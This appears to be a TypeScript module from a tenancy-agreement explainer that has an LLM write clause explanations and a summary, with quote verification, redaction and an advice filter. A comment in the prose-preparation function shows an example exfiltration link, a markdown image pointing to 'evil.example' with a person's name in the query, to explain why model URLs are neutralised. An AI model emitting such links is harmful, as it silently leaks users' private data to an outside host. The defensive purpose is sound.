import { z } from 'zod';
import type { Clause, VerifiedQuote } from '../domain/types.ts';
import type { CallOutcome } from '../model/budget.ts';
import { isModelError } from '../model/errors.ts';
import type { JsonRequest, LlmPort, Usage } from '../model/port.ts';
import { NO_USAGE, summariseZodError } from '../model/port.ts';
import { toGeminiSchema } from '../model/schema.ts';
import {
  findAdvicePhrases,
  neutraliseModelUrls,
  redactExcerpt,
  restoreForReader,
  type SafeDocument,
} from '../safety/index.ts';
import { SYSTEM_PREAMBLE } from '../safety/injection.ts';
import { readability } from '../util/readability.ts';
import { truncateWords } from '../util/text.ts';

/**
 * The model pass: plain-English explanation per clause, and the one-page summary.
 *
 * Note what this asks for and what it does not. It asks the model to say **what a clause means**
 * and to **quote the document** while doing it. It never asks whether the clause is lawful,
 * whether a cap is exceeded, or what the reader should do — those are computed in code against a
 * cited rule, or refused.
 *
 * Three properties are enforced here rather than trusted, and all three apply to *every* surface
 * the model produces, the summary included:
 *
 *  1. **Every paragraph carries an anchor.** Prose without a verbatim quote cannot be checked, and
 *     plan 05's criterion is unqualified: every output carries a verified citation or is not shown.
 *  2. **One bad entry loses one entry.** The batch is parsed item by item, so a single malformed
 *     explanation cannot take the other nineteen with it (plan 06).
 *  3. **The output is scanned for advice.** The request-side classifier guards what the reader
 *     asks; this guards what the model says back. Both directions, or the boundary is decorative.
 *
 * The plain-language target is justified rather than asserted. Consumer contracts measure around
 * Flesch-Kincaid grade 14.7, with 498 of 500 major sites' terms failing both standard thresholds,
 * and *Cognition* (2022) found that legal difficulty comes largely from poor writing — centre-
 * embedded clauses, long-distance dependencies — rather than from specialised concepts, impairing
 * recall even for experienced readers. Restructuring genuinely helps.
 */

/**
 * Schema note: `min()` constraints here are enforced by Zod *after* parsing and never reach the
 * provider, which ignores `minLength` silently. `model/schema.ts` strips them and says so.
 */
export const ClauseExplanationSchema = z.object({
  clauseId: z.string().min(1),
  /** What the clause does, in plain English. */
  plainEnglish: z.string().min(20),
  /** Verbatim from the document. Checked in code; the explanation is dropped if it fails. */
  quote: z.string().min(12),
  /** Whether the clause is unusual in context. A judgement, so it is schema-constrained. */
  unusual: z.boolean(),
});

export type ClauseExplanation = z.infer<typeof ClauseExplanationSchema>;

/**
 * The item shape as the *provider* is told it, lifted straight off the strict schema above.
 *
 * This exists because the wrapper below must be two things at once. Towards Gemini it has to carry
 * a complete item shape, or the model has no idea what to return. Towards our own parser it has to
 * be `unknown`, because `z.array(ClauseExplanationSchema)` is all-or-nothing: one entry failing
 * validation rejects the whole batch, which is precisely the failure plan 06 forbids. Deriving the
 * advertised shape from the schema keeps the two in step — there is no second copy to drift.
 */
function advertisedItemShape(schema: z.ZodType): Record<string, unknown> {
  return toGeminiSchema(schema).schema;
}

export const ClauseExplanationsSchema = z.object({
  explanations: z.array(z.unknown().meta(advertisedItemShape(ClauseExplanationSchema))).max(60),
});

/** The five parts of the one-page summary. Named, so a missing one is visible rather than absent. */
export const SUMMARY_PARTS = ['overview', 'money', 'timing', 'obligations', 'exit'] as const;
export type SummaryPart = (typeof SUMMARY_PARTS)[number];

export const SUMMARY_PART_LABELS: Readonly<Record<SummaryPart, string>> = {
  overview: 'Overview',
  money: 'Money',
  timing: 'Timing',
  obligations: 'Obligations',
  exit: 'Leaving',
};

/**
 * One paragraph of the summary, with the quote that has to hold it up.
 *
 * The `quote` field is the whole point of this shape. Before it existed, the summary was the only
 * model artefact that reached the reader with no quote, no offsets and nothing between it and the
 * page but a prompt instruction — the "trust the model" posture the rest of this codebase rejects.
 * A verifier cannot check what a schema does not carry.
 */
export const SummarySectionSchema = z.object({
  part: z.enum(SUMMARY_PARTS),
  text: z.string().min(20),
  /** Verbatim from the document, and the reason this paragraph is allowed to be shown at all. */
  quote: z.string().min(12),
});

export type SummarySection = z.infer<typeof SummarySectionSchema>;

export const LeaseSummarySchema = z.object({
  sections: z.array(z.unknown().meta(advertisedItemShape(SummarySectionSchema))).max(10),
});

/** A summary paragraph that survived verification: its quote is really in the document. */
export interface VerifiedSummarySection {
  readonly part: SummaryPart;
  readonly text: string;
  readonly anchor: VerifiedQuote;
}

/**
 * The reader-facing summary.
 *
 * Only paragraphs whose quote verified appear in `sections`. A partial summary is an acceptable
 * outcome; unverified prose is not, so `missingParts` names what is absent rather than leaving a
 * silent gap. When nothing verifies there is no summary at all — `analyse()` returns `null`.
 */
export interface LeaseSummary {
  readonly sections: readonly VerifiedSummarySection[];
  /** Parts not shown: the model did not produce them, or their quote did not verify. */
  readonly missingParts: readonly SummaryPart[];
}

/** Why one entry of a batch was thrown away. */
export type RejectionKind = 'invalid-shape' | 'advice';

export interface RejectedItem {
  /** The clause id or summary part the entry claimed, when it carried a usable one. */
  readonly id: string | null;
  readonly kind: RejectionKind;
  /** Diagnostic, for the note and for the per-item status. Never the rejected prose itself. */
  readonly reason: string;
}

export interface ExplainOutcome {
  readonly explanations: readonly ClauseExplanation[];
  /** Entries dropped for shape or for crossing the advice boundary. Never silently discarded. */
  readonly rejected: readonly RejectedItem[];
  readonly usage: Usage;
  /** Why the model pass produced nothing, when it did. Shown to the reader, not swallowed. */
  readonly note: string | null;
  /** Whether a call actually left the process and came back. Drives the usage meter. */
  readonly outcome: CallOutcome;
}

export interface SummaryOutcome {
  readonly sections: readonly SummarySection[];
  readonly rejected: readonly RejectedItem[];
  readonly usage: Usage;
  readonly note: string | null;
  readonly outcome: CallOutcome;
}

/** Keep the request bounded: the clauses that matter, not all eighty. */
const MAX_CLAUSES_PER_REQUEST = 24;
const CLAUSE_EXCERPT_CHARS = 900;

function clauseLabel(clause: Clause): string {
  if (clause.heading !== null) return clause.heading;
  const numbered = clause.path.join('.');
  return numbered.length > 0 ? numbered : 'unheaded';
}

/**
 * The clauses as the model reads them: the same redacted text the channel carries, not the raw
 * clause.
 *
 * This list sits in `task_input`, outside the document channel, and it once carried the original
 * clause text there — so a lease whose channel was fully redacted still sent "Mr. Kulkarni" to the
 * provider inside an excerpt. Each heading and excerpt is redacted with the channel's own map, which
 * is what lets a quote copied from here restore to the original text exactly as one copied from the
 * channel does. Redaction comes before truncation: a cut can split a name, and half a name is no
 * longer a value the map can find.
 */
function clauseList(clauses: readonly Clause[], safe: SafeDocument): string {
  return clauses
    .slice(0, MAX_CLAUSES_PER_REQUEST)
    .map((clause) => {
      const label = redactExcerpt(clauseLabel(clause), safe);
      const excerpt = truncateWords(redactExcerpt(clause.text, safe), CLAUSE_EXCERPT_CHARS);
      return `[${clause.id}] ${label}\n${excerpt}`;
    })
    .join('\n\n');
}

function claimedId(entry: unknown, key: string): string | null {
  if (typeof entry !== 'object' || entry === null) return null;
  const value = (entry as Record<string, unknown>)[key];
  return typeof value === 'string' && value.length > 0 ? value : null;
}

/**
 * Validate a batch one entry at a time.
 *
 * Plan 06: "One clause failing schema validation must not lose the other nineteen." That is not
 * achievable with a schema over the whole array, so the array arrives as `unknown[]` and each
 * entry is judged on its own. The id of a failed entry is salvaged where the entry carried one,
 * so the caller can mark exactly which section could not be analysed.
 */
export function parseBatch<T>(
  entries: readonly unknown[],
  schema: z.ZodType<T>,
  idKey: string,
): { readonly kept: readonly T[]; readonly rejected: readonly RejectedItem[] } {
  const kept: T[] = [];
  const rejected: RejectedItem[] = [];

  for (const entry of entries) {
    const result = schema.safeParse(entry);
    if (result.success) {
      kept.push(result.data);
      continue;
    }
    rejected.push({
      id: claimedId(entry, idKey),
      kind: 'invalid-shape',
      reason: summariseZodError(result.error),
    });
  }

  return { kept, rejected };
}

/**
 * Make one piece of generated prose fit to show, or refuse it.
 *
 * Order matters. URLs are neutralised **before** surrogates are restored, so a real name can never
 * be substituted into a link that is about to be rendered — `![](https://evil.example/?d=<name>)`
 * is a silent exfiltration channel and closing it is the single most important property in plan
 * 05. Only then are the surrogates reversed, in memory, on the way to the reader. The advice scan
 * runs last, on the text as it would actually appear.
 */
function prepareProse(
  text: string,
  safe: SafeDocument,
): { readonly text: string; readonly advice: readonly string[] } {
  const clean = restoreForReader(neutraliseModelUrls(text), safe);
  return { text: clean, advice: findAdvicePhrases(clean) };
}

const EXPLAIN_TASK = [
  'For each clause listed below, write one or two short sentences saying what it does, in plain',
  'English, for someone with no legal training. Aim for an eighth-grade reading level: short',
  'sentences, one idea each, no unexplained jargon.',
  '',
  'For each clause also return a short verbatim quote from that clause — copied exactly, including',
  'punctuation — that supports what you said. The quote is checked against the source document in',
  'code. If it does not match exactly, your whole explanation for that clause is discarded, so copy',
  'rather than paraphrase.',
  '',
  'Set "unusual" to true only where the clause is materially more one-sided than a standard',
  'residential tenancy would be. Do not say whether anything is lawful or enforceable. Do not say',
  'what the reader should do.',
].join('\n');

/**
 * Explain clauses.
 *
 * Failure is expected and handled: no key, an exhausted quota, a blocked response, a cassette
 * miss. Every one of them returns an empty result and a note, never an exception, because the
 * deterministic findings are the product's floor and must survive the model being unavailable.
 *
 * The distinction between `skipped` and `failed` is not pedantry. A skipped pass never built a
 * request; a failed one did and got nothing back. Neither is a model *call*, and reporting either
 * as one is how a usage meter ends up claiming two calls on a machine with no API key.
 */
export async function explainClauses(
  port: LlmPort,
  safe: SafeDocument,
  clauses: readonly Clause[],
): Promise<ExplainOutcome> {
  if (clauses.length === 0) {
    return { explanations: [], rejected: [], usage: NO_USAGE, note: null, outcome: 'skipped' };
  }

  const request: JsonRequest<z.infer<typeof ClauseExplanationsSchema>> = {
    task: 'explain-clauses',
    tier: 'analysis',
    systemInstruction: SYSTEM_PREAMBLE,
    document: safe.channel,
    task_input: `${EXPLAIN_TASK}\n\nClauses to explain:\n\n${clauseList(clauses, safe)}`,
    schema: ClauseExplanationsSchema,
  };

  let result: Awaited<
    ReturnType<typeof port.generateJson<z.infer<typeof ClauseExplanationsSchema>>>
  >;
  try {
    result = await port.generateJson(request);
  } catch (error) {
    return {
      explanations: [],
      rejected: [],
      usage: NO_USAGE,
      outcome: 'failed',
      note: isModelError(error)
        ? error.userMessage
        : 'The plain-English explanations could not be generated. The findings below are unaffected.',
    };
  }

  const parsed = parseBatch(result.value.explanations, ClauseExplanationSchema, 'clauseId');
  const explanations: ClauseExplanation[] = [];
  const rejected: RejectedItem[] = [...parsed.rejected];

  for (const entry of parsed.kept) {
    const prose = prepareProse(entry.plainEnglish, safe);
    if (prose.advice.length > 0) {
      rejected.push({
        id: entry.clauseId,
        kind: 'advice',
        reason: `generated prose used advice phrasing: "${prose.advice[0]}"`,
      });
      continue;
    }
    // The quote is reversed out of its surrogates too, because it is verified against the
    // *original* document text — the model only ever saw the redacted form of it.
    explanations.push({
      ...entry,
      plainEnglish: prose.text,
      quote: restoreForReader(entry.quote, safe),
    });
  }

  return { explanations, rejected, usage: result.usage, note: null, outcome: 'completed' };
}

const SUMMARY_TASK = [
  'Write a one-page plain-English summary of this tenancy agreement for the tenant, as a list of',
  'sections. Use each of these five "part" values exactly once:',
  '',
  '  overview    - two or three sentences on what this agreement is and how long it runs.',
  '  money       - what the tenant pays, when, and what is held as a deposit.',
  '  timing      - key dates and notice periods.',
  '  obligations - what each party must do, kept short.',
  '  exit        - how the tenancy ends, for each party.',
  '',
  'Every section must also carry a short verbatim quote from the document — copied exactly,',
  'including punctuation — that supports what that section says. The quote is checked against the',
  'source document in code, and a section whose quote does not match exactly is discarded and never',
  'shown. Copy rather than paraphrase, and if you cannot support a section with a real quote, leave',
  'that section out.',
  '',
  'Short sentences, one idea each, eighth-grade reading level. Describe only what the document says.',
  'Do not state what the law requires, do not say whether anything is enforceable, and do not',
  'recommend a course of action. Where the document is silent on something, say it is not mentioned.',
].join('\n');

export async function summariseLease(port: LlmPort, safe: SafeDocument): Promise<SummaryOutcome> {
  let result: Awaited<ReturnType<typeof port.generateJson<z.infer<typeof LeaseSummarySchema>>>>;
  try {
    result = await port.generateJson({
      task: 'summarise-lease',
      tier: 'analysis',
      systemInstruction: SYSTEM_PREAMBLE,
      document: safe.channel,
      task_input: SUMMARY_TASK,
      schema: LeaseSummarySchema,
    });
  } catch (error) {
    return {
      sections: [],
      rejected: [],
      usage: NO_USAGE,
      outcome: 'failed',
      note: isModelError(error)
        ? error.userMessage
        : 'The plain-English summary could not be generated.',
    };
  }

  const parsed = parseBatch(result.value.sections, SummarySectionSchema, 'part');
  const sections: SummarySection[] = [];
  const rejected: RejectedItem[] = [...parsed.rejected];

  for (const entry of parsed.kept) {
    const prose = prepareProse(entry.text, safe);
    if (prose.advice.length > 0) {
      rejected.push({
        id: entry.part,
        kind: 'advice',
        reason: `generated prose used advice phrasing: "${prose.advice[0]}"`,
      });
      continue;
    }
    sections.push({ ...entry, text: prose.text, quote: restoreForReader(entry.quote, safe) });
  }

  return { sections, rejected, usage: result.usage, note: null, outcome: 'completed' };
}

/**
 * How readable a set of generated passages is, as numbers a scorecard can print.
 *
 * Plan 06 sets the target — Flesch-Kincaid grade 8 or below, Reading Ease 60 or above — and the
 * prompts above ask for it, but asking is not measuring. This measures the prose the reader is
 * actually shown, after verification, with the fixed formulas in `util/readability.ts`.
 *
 * With nothing to measure every figure is `null`: the mean grade of no passages is undefined, and
 * reporting it as 0 would read as perfectly plain English.
 */
export interface ReadabilityAggregate {
  readonly passages: number;
  readonly meanGrade: number | null;
  /** The hardest passage. A mean can hide one unreadable paragraph; the maximum cannot. */
  readonly maxGrade: number | null;
  readonly meanReadingEase: number | null;
  readonly minReadingEase: number | null;
}

function round2(n: number): number {
  return Math.round(n * 100) / 100;
}

export function aggregateReadability(passages: readonly string[]): ReadabilityAggregate {
  if (passages.length === 0) {
    return {
      passages: 0,
      meanGrade: null,
      maxGrade: null,
      meanReadingEase: null,
      minReadingEase: null,
    };
  }

  const scores = passages.map((passage) => readability(passage));
  const grades = scores.map((score) => score.gradeLevel);
  const ease = scores.map((score) => score.readingEase);
  const mean = (values: readonly number[]): number =>
    round2(values.reduce((sum, value) => sum + value, 0) / values.length);

  return {
    passages: passages.length,
    meanGrade: mean(grades),
    maxGrade: Math.max(...grades),
    meanReadingEase: mean(ease),
    minReadingEase: Math.min(...ease),
  };
}
